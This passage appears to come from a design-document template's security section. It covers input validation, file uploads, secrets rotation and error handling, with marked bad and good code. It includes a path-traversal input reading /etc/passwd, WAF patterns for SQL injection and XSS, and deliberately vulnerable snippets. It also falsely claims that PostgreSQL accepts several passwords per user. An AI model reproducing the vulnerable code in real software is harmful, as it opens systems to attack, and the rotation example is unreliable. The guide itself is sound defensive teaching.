    assert "/src/" not in response.text
    assert "error_id" in response.json()

# Test: Resources cleaned up on exception
def test_resource_cleanup_on_exception():
    with pytest.raises(ProcessingError):
        process_file("/nonexistent/file.txt")

    # Verify no file handles leaked
    assert count_open_file_handles() == initial_handle_count
```

**Additional Controls**:
- Implement circuit breakers for external dependencies
- Use Result types instead of exceptions for expected errors
- Always use context managers (with statements) for resources
- Set maximum recursion depth
- Implement timeout mechanisms
- Monitor exception rates in production

```

---

### 5.3 Input Validation Framework

**Template Instructions**: Provide multi-layer input validation strategy for this domain.

**Example Structure**:
```markdown
### 5.3 Input Validation Framework

**Multi-Layer Validation Strategy**:

```
┌─────────────────────────────────────────────┐
│ Layer 1: Schema/Type Validation            │  ← Reject malformed data
├─────────────────────────────────────────────┤
│ Layer 2: Semantic/Business Logic Validation│  ← Reject invalid business data
├─────────────────────────────────────────────┤
│ Layer 3: Sanitization (for output)         │  ← Safe rendering/encoding
├─────────────────────────────────────────────┤
│ Layer 4: Defense in Depth                  │  ← DB constraints, WAF, rate limits
└─────────────────────────────────────────────┘
```

#### Layer 1: Schema & Type Validation

**Purpose**: Reject malformed data at the API boundary

```[language]
# Example: Pydantic (Python) for request validation
from pydantic import BaseModel, EmailStr, Field, validator
from typing import Optional

class UserCreateRequest(BaseModel):
    username: str = Field(..., min_length=3, max_length=50, regex=r'^[a-zA-Z0-9_-]+$')
    email: EmailStr  # Built-in email validation
    password: str = Field(..., min_length=12, max_length=128)
    age: Optional[int] = Field(None, ge=0, le=150)

    @validator('password')
    def password_strength(cls, v):
        # Custom validation: password must contain uppercase, lowercase, digit, special char
        if not any(c.isupper() for c in v):
            raise ValueError('Password must contain uppercase letter')
        if not any(c.islower() for c in v):
            raise ValueError('Password must contain lowercase letter')
        if not any(c.isdigit() for c in v):
            raise ValueError('Password must contain digit')
        if not any(c in '!@#$%^&*()_+-=[]{}|;:,.<>?' for c in v):
            raise ValueError('Password must contain special character')
        return v

    @validator('username')
    def username_no_reserved_words(cls, v):
        # Reject reserved usernames
        reserved = {'admin', 'root', 'system', 'administrator'}
        if v.lower() in reserved:
            raise ValueError('Username is reserved')
        return v

# Usage in API endpoint
@app.post("/api/users")
async def create_user(user_data: UserCreateRequest):  # Automatic validation!
    # If we reach here, data is already validated
    return await user_service.create(user_data)
```

#### Layer 2: Business Logic Validation

**Purpose**: Enforce domain-specific rules

```[language]
# Example: Business rule validation
async def create_user(user_data: UserCreateRequest) -> User:
    # Check if email/username already exists
    existing_user = await db.query(User).filter(
        (User.email == user_data.email) | (User.username == user_data.username)
    ).first()

    if existing_user:
        if existing_user.email == user_data.email:
            raise BusinessValidationError("Email already registered")
        if existing_user.username == user_data.username:
            raise BusinessValidationError("Username already taken")

    # Check if email domain is allowed (if domain restrictions exist)
    if not is_allowed_email_domain(user_data.email):
        raise BusinessValidationError("Email domain not allowed")

    # Additional business rules...

    return await db.insert(user_data)
```

#### Layer 3: Output Encoding & Sanitization

**Purpose**: Prevent injection when rendering/using validated data

```[language]
# Example: Context-aware output encoding
from markupsafe import escape  # For HTML
import json  # For JSON
import urllib.parse  # For URLs

def render_user_profile_html(user: User):
    # HTML context - escape HTML special chars
    return f"""
    <div class="profile">
        <h1>{escape(user.username)}</h1>
        <p>{escape(user.bio)}</p>
        <a href="{escape(user.website)}">Website</a>
    </div>
    """

def render_user_profile_json(user: User):
    # JSON context - use json.dumps for proper encoding
    return json.dumps({
        "username": user.username,
        "bio": user.bio
    })

def generate_redirect_url(user_input: str):
    # URL context - URL-encode parameters
    return f"/search?q={urllib.parse.quote(user_input)}"
```

#### Layer 4: Defense in Depth

**Purpose**: Multiple layers of protection beyond application code

```sql
-- Database constraints (belt + suspenders)
CREATE TABLE users (
    id SERIAL PRIMARY KEY,
    username VARCHAR(50) UNIQUE NOT NULL CHECK (LENGTH(username) >= 3),
    email VARCHAR(255) UNIQUE NOT NULL CHECK (email ~* '^[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}$'),
    age INTEGER CHECK (age >= 0 AND age <= 150),
    created_at TIMESTAMP DEFAULT NOW()
);

-- Indices for performance
CREATE INDEX idx_users_email ON users(email);
CREATE INDEX idx_users_username ON users(username);
```

```yaml
# WAF rules (e.g., ModSecurity, AWS WAF)
- rule_id: 001
  description: "Block SQL injection patterns"
  pattern: "(union.*select|select.*from|insert.*into|delete.*from|drop.*table)"
  action: block

- rule_id: 002
  description: "Block XSS patterns"
  pattern: "(<script|javascript:|onerror=|onclick=)"
  action: block

- rule_id: 003
  description: "Rate limiting"
  max_requests: 100
  per: "5 minutes"
  action: throttle
```

**Input Validation Checklist**:
- [ ] All user inputs validated at API boundary (schema validation)
- [ ] Business rules enforced (domain validation)
- [ ] Output encoded for context (HTML, JSON, URL, SQL)
- [ ] Database constraints mirror application validation
- [ ] WAF rules for common attack patterns
- [ ] Rate limiting on all public endpoints
- [ ] File upload restrictions (type, size, content validation)
- [ ] Path traversal protection for file operations
```

---

#### 5.3.6 File Upload Security (MANDATORY if accepting files)

**Principle**: Never trust file uploads. Validate by content, not filename.

```markdown
### Secure File Upload Implementation

**Multi-Layer File Upload Validation**:

**Step 1: Validate File Type by Content (Magic Bytes)**:
```[language]
# ✅ Validate file type by reading magic bytes (file signature)
import magic  # python-magic library

ALLOWED_FILE_SIGNATURES = {
    'image/jpeg': [b'\xFF\xD8\xFF'],
    'image/png': [b'\x89\x50\x4E\x47'],
    'image/gif': [b'\x47\x49\x46\x38'],
    'application/pdf': [b'\x25\x50\x44\x46'],
    'application/zip': [b'\x50\x4B\x03\x04', b'\x50\x4B\x05\x06'],
}

def validate_file_type(file_content: bytes, expected_mime: str) -> bool:
    """Validate file type by magic bytes, not extension"""

    # Read magic bytes
    mime = magic.from_buffer(file_content, mime=True)

    # Verify against expected type
    if mime != expected_mime:
        raise ValidationError(f"File type mismatch. Expected {expected_mime}, got {mime}")

    # Additional: Check magic bytes directly
    magic_bytes = file_content[:8]
    allowed_signatures = ALLOWED_FILE_SIGNATURES.get(mime, [])

    if not any(magic_bytes.startswith(sig) for sig in allowed_signatures):
        raise ValidationError("Invalid file signature")

    return True

# ❌ BAD: Trust file extension
def bad_validate(filename: str):
    if not filename.endswith('.jpg'):
        raise ValidationError("Only JPG files allowed")
    # Attacker can upload malware.php.jpg or malware.php with .jpg extension!

# ✅ GOOD: Validate by content
def handle_upload(file):
    content = file.read()
    validate_file_type(content, 'image/jpeg')
```

**Step 2: Scan for Malware**:
```[language]
# ✅ Scan files with ClamAV or similar
import clamd

def scan_for_malware(file_content: bytes) -> bool:
    """Scan file for malware using ClamAV"""
    cd = clamd.ClamdUnixSocket()

    scan_result = cd.instream(file_content)

    if scan_result['stream'][0] == 'FOUND':
        virus_name = scan_result['stream'][1]
        raise SecurityError(f"Malware detected: {virus_name}")

    return True

# Alternative: Use cloud scanning service
def scan_with_cloud_service(file_content: bytes) -> bool:
    """Scan using VirusTotal API"""
    import requests

    response = requests.post(
        'https://www.virustotal.com/api/v3/files',
        headers={'x-apikey': VIRUSTOTAL_API_KEY},
        files={'file': file_content}
    )

    # Check scan results
    analysis_id = response.json()['data']['id']
    # Poll for results and verify 0 detections
```

**Step 3: Size & Dimension Limits**:
```[language]
# ✅ Enforce size limits
MAX_FILE_SIZE = 10 * 1024 * 1024  # 10MB
MAX_IMAGE_DIMENSIONS = (4096, 4096)  # pixels

def validate_file_size(file_content: bytes):
    if len(file_content) > MAX_FILE_SIZE:
        raise ValidationError(f"File too large. Max size: {MAX_FILE_SIZE / 1024 / 1024}MB")

def validate_image_dimensions(file_content: bytes):
    """Prevent decompression bombs"""
    from PIL import Image
    import io

    try:
        image = Image.open(io.BytesIO(file_content))
        width, height = image.size

        if width > MAX_IMAGE_DIMENSIONS[0] or height > MAX_IMAGE_DIMENSIONS[1]:
            raise ValidationError(f"Image dimensions too large. Max: {MAX_IMAGE_DIMENSIONS}")

        # Detect decompression bombs
        if width * height > 100_000_000:  # 100 megapixels
            raise ValidationError("Potential decompression bomb detected")

    except Exception as e:
        raise ValidationError(f"Invalid image file: {str(e)}")
```

**Step 4: Safe Storage**:
```[language]
# ✅ Store files securely
from uuid import uuid4
import os

def store_uploaded_file(file_content: bytes, original_filename: str, user_id: str) -> str:
    """Store file with security best practices"""

    # 1. Generate random filename (prevent path traversal, overwrite attacks)
    file_extension = get_safe_extension(original_filename)
    safe_filename = f"{uuid4()}{file_extension}"

    # 2. Store in isolated location (NOT in web root!)
    storage_path = f"/var/app/uploads/{user_id}/{safe_filename}"

    # 3. Set restrictive permissions
    os.umask(0o077)  # Only owner can read/write

    # 4. Write file
    with open(storage_path, 'wb') as f:
        f.write(file_content)

    # 5. Set file permissions explicitly
    os.chmod(storage_path, 0o600)  # -rw-------

    return safe_filename

def get_safe_extension(filename: str) -> str:
    """Extract and validate file extension"""
    # Get extension
    _, ext = os.path.splitext(filename)
    ext = ext.lower()

    # Allowlist
    ALLOWED_EXTENSIONS = {'.jpg', '.jpeg', '.png', '.gif', '.pdf'}

    if ext not in ALLOWED_EXTENSIONS:
        return ''  # No extension for unallowed types

    return ext
```

**Step 5: Serve Files Safely**:
```[language]
# ✅ Serve files via separate domain/CDN (prevent XSS)
def generate_download_url(filename: str, user_id: str) -> str:
    """Generate safe download URL"""

    # Serve from separate domain (not main app domain)
    # This prevents XSS attacks via malicious file content
    cdn_domain = "https://cdn-uploads.example.com"

    # Generate signed URL with expiration
    expiration = int(time.time()) + 3600  # 1 hour
    signature = hmac.new(
        SECRET_KEY.encode(),
        f"{filename}:{user_id}:{expiration}".encode(),
        hashlib.sha256
    ).hexdigest()

    return f"{cdn_domain}/files/{user_id}/{filename}?expires={expiration}&sig={signature}"

# ❌ BAD: Serve directly from application
@app.get("/uploads/{filename}")
def download_file_bad(filename: str):
    # Allows path traversal: ../../etc/passwd
    # Allows XSS if HTML file uploaded
    return FileResponse(f"/var/uploads/{filename}")

# ✅ GOOD: Validate and set headers
@app.get("/uploads/{filename}")
def download_file_good(filename: str, user_id: str):
    # 1. Validate filename (no path traversal)
    if '..' in filename or '/' in filename:
        raise ValidationError("Invalid filename")

    # 2. Verify ownership
    file_path = f"/var/app/uploads/{user_id}/{filename}"
    if not os.path.exists(file_path):
        raise NotFound()

    # 3. Set security headers
    headers = {
        'Content-Disposition': f'attachment; filename="{filename}"',  # Force download
        'X-Content-Type-Options': 'nosniff',  # Prevent MIME sniffing
        'Content-Security-Policy': "default-src 'none'",  # No script execution
    }

    return FileResponse(file_path, headers=headers)
```

**Complete Upload Handler**:
```[language]
# ✅ Complete secure file upload implementation
@app.post("/api/v1/files/upload")
async def upload_file(
    file: UploadFile,
    current_user: User = Depends(get_current_user)
):
    """Secure file upload endpoint"""

    # 1. Check file size before reading
    file.file.seek(0, 2)  # Seek to end
    file_size = file.file.tell()
    file.file.seek(0)  # Reset

    if file_size > MAX_FILE_SIZE:
        raise ValidationError("File too large")

    # 2. Read file content
    file_content = await file.read()

    # 3. Validate file type by content
    validate_file_type(file_content, expected_mime='image/jpeg')

    # 4. Scan for malware
    scan_for_malware(file_content)

    # 5. Validate dimensions (for images)
    validate_image_dimensions(file_content)

    # 6. Store securely
    safe_filename = store_uploaded_file(
        file_content,
        file.filename,
        current_user.id
    )

    # 7. Generate download URL
    download_url = generate_download_url(safe_filename, current_user.id)

    # 8. Store metadata in database
    file_record = await db.insert(FileUpload(
        id=uuid4(),
        user_id=current_user.id,
        original_filename=file.filename,
        stored_filename=safe_filename,
        file_size=file_size,
        mime_type='image/jpeg',
        uploaded_at=datetime.utcnow()
    ))

    return {
        'id': file_record.id,
        'filename': safe_filename,
        'download_url': download_url
    }
```

**File Upload Security Checklist**:
- [ ] Validate file type by magic bytes, not extension
- [ ] Scan for malware with ClamAV or cloud service
- [ ] Enforce size limits (prevent DoS)
- [ ] Validate image dimensions (prevent decompression bombs)
- [ ] Generate random filenames (prevent overwrite, path traversal)
- [ ] Store outside web root in isolated directory
- [ ] Set restrictive file permissions (0600)
- [ ] Serve from separate domain/CDN (prevent XSS)
- [ ] Use Content-Disposition: attachment header
- [ ] Set X-Content-Type-Options: nosniff header
- [ ] Implement signed URLs with expiration
- [ ] Log all uploads for audit trail
```

---

### 5.4 Secrets Management

**Template Instructions**: Demonstrate secure secrets management for this domain.

**Example Structure**:
```markdown
### 5.4 Secrets Management

**NEVER Hardcode Credentials** - All examples below show what NOT to do vs. secure alternatives.

#### ❌ NEVER DO THIS

```[language]
# NEVER hardcode secrets in source code
API_KEY = "sk-1234567890abcdef"
DATABASE_URL = "postgresql://admin:P@ssw0rd123@db.example.com/production"
AWS_ACCESS_KEY = "AKIAIOSFODNN7EXAMPLE"
AWS_SECRET_KEY = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"

# NEVER commit .env files with real secrets to git
# NEVER log secrets
logger.info(f"Connecting with API key: {API_KEY}")  # ❌❌❌
```

**Why this is dangerous**:
- Secrets in git history (even if later deleted)
- Exposed in logs, error messages, stack traces
- Visible to anyone with code access
- Difficult to rotate
- Compliance violations

#### ✅ Environment Variables (Basic - Minimum Requirement)

```[language]
# ✅ Load from environment variables
import os

API_KEY = os.environ.get("API_KEY")
if not API_KEY:
    raise ConfigurationError("API_KEY environment variable not set")

DATABASE_URL = os.environ["DATABASE_URL"]  # Will raise KeyError if missing

# ✅ Use a settings management library (Better)
from pydantic_settings import BaseSettings
from pydantic import SecretStr, Field

class Settings(BaseSettings):
    api_key: SecretStr  # SecretStr hides value in logs/repr
    database_url: str = Field(..., description="PostgreSQL connection string")
    aws_access_key_id: str
    aws_secret_access_key: SecretStr

    class Config:
        env_file = ".env"  # Load from .env in development
        env_file_encoding = "utf-8"
        case_sensitive = False

settings = Settings()  # Validates on startup, crashes if missing

# Access secrets
api_key_value = settings.api_key.get_secret_value()  # Only when needed
```

**Environment Setup**:
```bash
# .env file (for development only - NEVER commit to git)
API_KEY=sk-dev-key-here
DATABASE_URL=postgresql://localhost/dev_db
AWS_ACCESS_KEY_ID=your-dev-key
AWS_SECRET_ACCESS_KEY=your-dev-secret

# .gitignore (MUST include)
.env
.env.*
!.env.example  # Template without real secrets

# .env.example (Template for developers)
API_KEY=your-api-key-here
DATABASE_URL=postgresql://localhost/your_db
AWS_ACCESS_KEY_ID=your-aws-key
AWS_SECRET_ACCESS_KEY=your-aws-secret
```

#### ✅ Secret Management Services (Production - Recommended)

**For Cloud Deployments**:

```[language]
# AWS Secrets Manager
import boto3
from botocore.exceptions import ClientError
import json

def get_secret(secret_name: str) -> dict:
    """Retrieve secret from AWS Secrets Manager."""
    session = boto3.session.Session()
    client = session.client(service_name='secretsmanager')

    try:
        response = client.get_secret_value(SecretId=secret_name)
        return json.loads(response['SecretString'])
    except ClientError as e:
        logger.error(f"Failed to retrieve secret: {e}")
        raise

# Usage
db_credentials = get_secret("production/database")
DATABASE_URL = db_credentials["connection_string"]

# Azure Key Vault
from azure.identity import DefaultAzureCredential
from azure.keyvault.secrets import SecretClient

def get_secret_azure(vault_url: str, secret_name: str) -> str:
    """Retrieve secret from Azure Key Vault."""
    credential = DefaultAzureCredential()
    client = SecretClient(vault_url=vault_url, credential=credential)
    secret = client.get_secret(secret_name)
    return secret.value

# GCP Secret Manager
from google.cloud import secretmanager

def get_secret_gcp(project_id: str, secret_id: str, version_id: str = "latest") -> str:
    """Retrieve secret from GCP Secret Manager."""
    client = secretmanager.SecretManagerServiceClient()
    name = f"projects/{project_id}/secrets/{secret_id}/versions/{version_id}"
    response = client.access_secret_version(request={"name": name})
    return response.payload.data.decode("UTF-8")
```

**For Kubernetes**:

```yaml
# Kubernetes Secret (base64 encoded)
apiVersion: v1
kind: Secret
metadata:
  name: app-secrets
type: Opaque
data:
  api-key: c2stMTIzNDU2Nzg5MGFiY2RlZg==  # base64 encoded
  database-url: cG9zdGdyZXNxbDovL2xvY2FsaG9zdC9kYg==

---
# Pod using secret as environment variable
apiVersion: v1
kind: Pod
metadata:
  name: app-pod
spec:
  containers:
  - name: app
    image: myapp:latest
    env:
    - name: API_KEY
      valueFrom:
        secretKeyRef:
          name: app-secrets
          key: api-key
    - name: DATABASE_URL
      valueFrom:
        secretKeyRef:
          name: app-secrets
          key: database-url
```

**For HashiCorp Vault**:

```[language]
import hvac

def get_secret_vault(vault_url: str, token: str, secret_path: str) -> dict:
    """Retrieve secret from HashiCorp Vault."""
    client = hvac.Client(url=vault_url, token=token)

    # Read secret
    response = client.secrets.kv.v2.read_secret_version(
        path=secret_path,
        mount_point='secret'
    )

    return response['data']['data']

# Usage
secrets = get_secret_vault(
    vault_url="https://vault.example.com",
    token=os.environ["VAULT_TOKEN"],  # Token from env
    secret_path="production/database"
)
DATABASE_URL = secrets["connection_string"]
```

#### 5.4.3 Automated Secret Rotation (MANDATORY for Production)

**Principle**: Secrets MUST be rotated regularly to limit blast radius of compromise.

```markdown
### Secret Rotation Strategy

**Rotation Frequency** (MANDATORY):
| Secret Type | Rotation Frequency | Automation | Grace Period |
|-------------|-------------------|------------|--------------|
| Database passwords | 90 days | Automated | 24 hours |
| API keys | 180 days | Automated | 7 days |
| TLS certificates | 30 days before expiry | Automated (cert-manager) | 30 days |
| JWT signing keys | 365 days | Manual (backward compat required) | 90 days |
| Encryption keys | Key versioning (no rotation) | Automated key versioning | N/A |

**Zero-Downtime Database Password Rotation**:
```[language]
# ✅ Rotate database password without downtime
import boto3
import psycopg2
from datetime import datetime, timedelta
import time

class DatabasePasswordRotator:
    def __init__(self, db_host: str, db_name: str, db_user: str):
        self.db_host = db_host
        self.db_name = db_name
        self.db_user = db_user
        self.secrets_client = boto3.client('secretsmanager')

    def rotate_password(self, grace_period_seconds: int = 86400):
        """Rotate database password with grace period"""

        # 1. Generate new secure password
        new_password = self._generate_secure_password(32)

        # 2. Add new password to database (multi-password support)
        self._add_database_password(new_password)
        logger.info("Added new password to database")

        # 3. Update secret in AWS Secrets Manager with BOTH passwords
        old_password = self._get_current_password()
        self._update_secret_with_versioning(old_password, new_password)
        logger.info("Updated secret manager with new password")

        # 4. Wait for all application instances to pick up new secret
        logger.info(f"Grace period: waiting {grace_period_seconds}s for all instances to refresh")
        time.sleep(grace_period_seconds)

        # 5. Remove old password from database
        self._revoke_database_password(old_password)
        logger.info("Revoked old password from database")

        # 6. Audit logging
        self._log_rotation_event()

    def _add_database_password(self, new_password: str):
        """Add new password (database supports multiple passwords per user)"""
        conn = psycopg2.connect(
            host=self.db_host,
            database=self.db_name,
            user='admin',  # Admin user to modify passwords
            password=os.environ['DB_ADMIN_PASSWORD']
        )

        with conn.cursor() as cur:
            # PostgreSQL allows multiple valid passwords
            cur.execute(f"ALTER USER {self.db_user} PASSWORD '{new_password}'")
            conn.commit()

        conn.close()

    def _revoke_database_password(self, old_password: str):
        """Remove old password after grace period"""
        # Implementation depends on database
        # For databases without multi-password support, skip this step
        pass

    def _get_current_password(self) -> str:
        """Fetch current password from secrets manager"""
        response = self.secrets_client.get_secret_value(
            SecretId=f'{self.db_name}/password'
        )
        return json.loads(response['SecretString'])['password']

    def _update_secret_with_versioning(self, old_password: str, new_password: str):
        """Update secret with version tracking"""
        secret_value = {
            'password': new_password,
            'previous_password': old_password,  # Grace period support
            'rotated_at': datetime.utcnow().isoformat(),
            'rotation_number': self._get_rotation_count() + 1
        }

        self.secrets_client.put_secret_value(
            SecretId=f'{self.db_name}/password',
            SecretString=json.dumps(secret_value)
        )

    def _generate_secure_password(self, length: int = 32) -> str:
        """Generate cryptographically secure password"""
        import secrets
        import string

        alphabet = string.ascii_letters + string.digits + "!@#$%^&*()_+-="
        return ''.join(secrets.choice(alphabet) for _ in range(length))

    def _log_rotation_event(self):
        """Audit log rotation event"""
        audit_log.record({
            'event': 'secret_rotation',
            'secret_type': 'database_password',
            'database': self.db_name,
            'user': self.db_user,
            'timestamp': datetime.utcnow().isoformat(),
            'rotated_by': 'automated_rotation_job'
        })

# Scheduled rotation (run via cron or scheduled job)
def rotate_all_database_passwords():
    """Run daily to check if rotation is needed"""
    databases = ['production_db', 'analytics_db', 'cache_db']

    for db_name in databases:
        rotator = DatabasePasswordRotator(
            db_host=os.environ[f'{db_name.upper()}_HOST'],
            db_name=db_name,
            db_user='app_user'
        )

        # Check if rotation is due
        last_rotation = get_last_rotation_date(db_name)
        if datetime.utcnow() - last_rotation > timedelta(days=90):
            logger.info(f"Rotating password for {db_name}")
            rotator.rotate_password(grace_period_seconds=86400)  # 24 hour grace
        else:
            logger.info(f"Password for {db_name} not due for rotation")
```

**API Key Rotation with Backward Compatibility**:
```[language]
# ✅ API key rotation with multiple active keys
class APIKeyRotator:
    def rotate_api_key(self, service_name: str):
        """Rotate API key while keeping old key valid for grace period"""

        # 1. Generate new API key
        new_key = self._generate_api_key()

        # 2. Store new key in secrets manager
        self._store_new_key(service_name, new_key)

        # 3. Add new key to API gateway (both keys now valid)
        self._add_key_to_gateway(service_name, new_key)

        # 4. Notify all consumers to update (email, Slack, etc.)
        self._notify_key_rotation(service_name, new_key)

        # 5. Schedule old key deprecation (7 days grace period)
        self._schedule_key_deprecation(service_name, days=7)

        return new_key

    def _add_key_to_gateway(self, service_name: str, new_key: str):
        """Add new key while keeping old key active"""
        # Multiple keys can be valid simultaneously
        api_gateway.add_valid_key(service_name, new_key)

    def _schedule_key_deprecation(self, service_name: str, days: int):
        """Schedule removal of old key after grace period"""
        deprecation_date = datetime.utcnow() + timedelta(days=days)

        # Schedule job to revoke old key
        scheduler.schedule(
            job=lambda: self._revoke_old_key(service_name),
            run_at=deprecation_date
        )

    def _revoke_old_key(self, service_name: str):
        """Revoke old API key after grace period"""
        old_keys = api_gateway.get_keys(service_name)

        # Keep only most recent key
        for key in old_keys[:-1]:  # All except last (newest)
            api_gateway.revoke_key(key)
            logger.info(f"Revoked old API key for {service_name}: {key[:8]}...")
```

**TLS Certificate Rotation (Automated)**:
```yaml
# ✅ Automated cert rotation with cert-manager (Kubernetes)
apiVersion: cert-manager.io/v1
kind: Certificate
metadata:
  name: [service]-tls
spec:
  secretName: [service]-tls-secret
  issuerRef:
    name: letsencrypt-prod
    kind: ClusterIssuer
  dnsNames:
    - [service].example.com
  duration: 2160h  # 90 days
  renewBefore: 720h  # Renew 30 days before expiry (automatic)

  # Automated rotation configuration
  privateKey:
    algorithm: RSA
    size: 2048
    rotationPolicy: Always  # Generate new key on renewal
```

**Secret Rotation Monitoring**:
```[language]
# ✅ Monitor secret age and alert before expiry
def check_secret_expiry():
    """Alert if secrets are close to expiry"""

    secrets = [
        ('database_password', 90),  # Days
        ('api_key', 180),
        ('tls_cert', 30),
    ]

    for secret_name, max_age_days in secrets:
        last_rotation = get_secret_metadata(secret_name)['rotated_at']
        age_days = (datetime.utcnow() - last_rotation).days

        # Alert if >80% of rotation period elapsed
        if age_days > max_age_days * 0.8:
            alert_ops_team({
                'alert': 'Secret rotation due soon',
                'secret': secret_name,
                'age_days': age_days,
                'max_age_days': max_age_days,
                'action': f'Rotate within {max_age_days - age_days} days'
            })

# Run daily
schedule.every().day.at("09:00").do(check_secret_expiry)
```
```

**Secrets Management Checklist**:
- [ ] NO secrets hardcoded in source code
- [ ] NO secrets in git repository (check with git-secrets, truffleHog)
- [ ] `.env` files in `.gitignore`
- [ ] Environment variables for local development
- [ ] Secret management service for production (AWS Secrets Manager, Azure Key Vault, etc.)
- [ ] Secrets rotation implemented (at least quarterly)
- [ ] Secrets access logged for audit trail
- [ ] Principle of least privilege (only necessary services can access secrets)
- [ ] Secrets encrypted at rest and in transit
- [ ] `SecretStr` or equivalent used in code (prevents accidental logging)
```

---

### 5.5 Error Handling & Information Disclosure

**Example Structure**:
```markdown
### 5.5 Error Handling & Information Disclosure Prevention

**CRITICAL**: Never expose internal details in error messages to end users.

#### ❌ INFORMATION LEAKAGE

```[language]
# ❌ Exposing stack traces to users
@app.exception_handler(Exception)
async def handle_exception(request, exc):
    # NEVER do this - exposes file paths, code, database schema
    return JSONResponse(
        status_code=500,
        content={"error": str(exc), "traceback": traceback.format_exc()}
    )

# ❌ Exposing database errors
def get_user(user_id: int):
    try:
        return db.execute(f"SELECT * FROM users WHERE id = {user_id}")
    except Exception as e:
        # Exposes database type, table names, column names
        return {"error": f"Database error: {e}"}

# ❌ Timing attacks on authentication
def check_password(username: str, password: str) -> bool:
    user = get_user_by_username(username)
    if not user:
        return False  # Returns immediately if user doesn't exist
    return verify_password(password, user.password_hash)  # Takes time if user exists
    # Attacker can enumerate valid usernames by measuring response time!
```

#### ✅ SAFE ERROR HANDLING

```[language]
# ✅ User-safe error messages with internal logging
import logging
import uuid

logger = logging.getLogger(__name__)

class ErrorResponse(BaseModel):
    error: str
    error_id: str  # For support/debugging
    timestamp: datetime

@app.exception_handler(Exception)
async def handle_exception(request: Request, exc: Exception):
    # Generate unique error ID
    error_id = str(uuid.uuid4())

    # Log full details internally (with error ID for correlation)
    logger.exception(
        "Unhandled exception",
        extra={
            "error_id": error_id,
            "request_path": request.url.path,
            "request_method": request.method,
            "user_id": getattr(request.state, "user_id", None)
        },
        exc_info=exc
    )

    # Return safe message to user
    return JSONResponse(
        status_code=500,
        content=ErrorResponse(
            error="An internal error occurred. Please contact support with error ID.",
            error_id=error_id,
            timestamp=datetime.utcnow()
        ).dict()
    )

# ✅ Specific error types with safe messages
class UserFacingError(Exception):
    """Base class for errors that can be shown to users."""
    def __init__(self, message: str, status_code: int = 400):
        self.message = message
        self.status_code = status_code

class ValidationError(UserFacingError):
    """Input validation failed."""
    def __init__(self, message: str):
        super().__init__(message, status_code=400)

class AuthenticationError(UserFacingError):
    """Authentication failed."""
    def __init__(self):
        # Generic message, doesn't reveal if user exists
        super().__init__("Invalid credentials", status_code=401)

class AuthorizationError(UserFacingError):
    """Authorization failed."""
    def __init__(self):
        # Generic message, doesn't reveal why
        super().__init__("Access denied", status_code=403)

# ✅ Constant-time comparison for authentication
import hmac

def check_password(username: str, password: str) -> bool:
    user = get_user_by_username(username)

    if not user:
        # Still perform hash comparison (with dummy hash) to prevent timing attack
        dummy_hash = "$2b$12$dummy_hash_that_will_never_match"
        verify_password(password, dummy_hash)
        return False

    # Constant-time comparison
    return verify_password(password, user.password_hash)

def verify_password(plain_password: str, hashed_password: str) -> bool:
    # Using bcrypt or argon2 (already constant-time)
    return bcrypt.checkpw(plain_password.encode(), hashed_password.encode())
```

**Error Handling Taxonomy**:

| Error Category | HTTP Status | User Message | Internal Logging |
|---------------|-------------|--------------|------------------|
| Validation | 400 | Specific field errors | Log validation failures |
| Authentication | 401 | "Invalid credentials" | Log auth attempts (rate limit!) |
| Authorization | 403 | "Access denied" | Log authz failures with user_id + resource |
| Not Found | 404 | "Resource not found" | Log if suspicious (enumeration attempt) |
| Business Logic | 400/409 | Specific business rule | Log business rule violations |
| Rate Limit | 429 | "Too many requests" | Log rate limit hits |
| Internal Error | 500 | "Internal error occurred" | Log full exception with correlation ID |
| Service Unavailable | 503 | "Service temporarily unavailable" | Log infrastructure issues |

**Error Handling Checklist**:
- [ ] All exceptions caught at top level
- [ ] User-facing errors are safe (no stack traces, file paths, database details)
- [ ] Internal errors logged with rich context (correlation ID, user ID, request details)
- [ ] Correlation IDs provided to users for support
- [ ] Authentication uses constant-time comparison
- [ ] Rate limiting on authentication endpoints
- [ ] Different error messages don't leak information (e.g., "user exists")
```

---

### 5.6 Performance & Scalability (MANDATORY for Production Systems)

**Template Instructions**:
- **MANDATORY FOR**: All MEDIUM/HIGH-risk production systems
- **SKIP IF**: Pure development tools, local-only utilities, proof-of-concepts
- **REFERENCE**: Aligns with Section 4.3 (Caching Patterns) - expand with domain-specific optimizations

**Content to Include**:

#### 5.6.1 Performance Requirements & SLOs

**Service Level Objectives (SLOs)**:
```markdown
### Performance SLOs

| Metric | Target (p50) | Target (p95) | Target (p99) | Alert Threshold |
|--------|--------------|--------------|--------------|-----------------|
| API Response Time | <100ms | <300ms | <500ms | p99 >1s |
| Database Queries | <10ms | <50ms | <100ms | p99 >200ms |
| Cache Hit Rate | >85% | >80% | >75% | <70% |
| Error Rate | <0.01% | <0.1% | <0.5% | >1% |
| Throughput | >[X] req/s | >[Y] req/s | >[Z] req/s | <[W] req/s |

**Measurement**:
```[language]
# Example: Track request duration
import time
from [observability_library] import metrics

def measure_request(func):
    def wrapper(*args, **kwargs):
        start = time.time()
        try:
            result = func(*args, **kwargs)
            metrics.histogram('[service]_request_duration_seconds',
                            time.time() - start,
                            tags={'endpoint': func.__name__, 'status': 'success'})
            return result
        except Exception as e:
            metrics.histogram('[service]_request_duration_seconds',
                            time.time() - start,
                            tags={'endpoint': func.__name__, 'status': 'error'})
            raise
    return wrapper
```
```

#### 5.6.2 Multi-Layer Caching Strategy

**Reference Section 4.3** for detailed caching patterns. Expand here with domain-specific guidance:

```markdown
### Caching Strategy for [Domain]

**Layer 1: Browser/Client Cache** (Static Assets Only):
```http
# Cache static assets (JS, CSS, images) for 1 year
Cache-Control: public, max-age=31536000, immutable

# Cache API responses briefly (or not at all for dynamic data)
Cache-Control: no-cache, must-revalidate
```

**Layer 2: CDN Cache** ([CloudFront/Cloudflare/Akamai]):
```[config_format]
# Cache rules for [domain]
cache_rules:
  - pattern: "/static/*"
    ttl: 31536000  # 1 year
  - pattern: "/api/public/[resource]/*"
    ttl: 300       # 5 minutes (for semi-static API data)
  - pattern: "/api/*"
    ttl: 0         # Never cache (dynamic)
```

**Layer 3: Application Cache** (Redis/Memcached):
```[language]
# ✅ Cache expensive computations
def get_[resource](id: str) -> [Resource]:
    cache_key = f'[resource]:{id}'

    # Try cache first
    cached = redis_client.get(cache_key)
    if cached:
        return json.loads(cached)

    # Cache miss: fetch from database
    [resource] = db.query_[resource](id)

    # Store in cache with TTL
    redis_client.setex(
        cache_key,
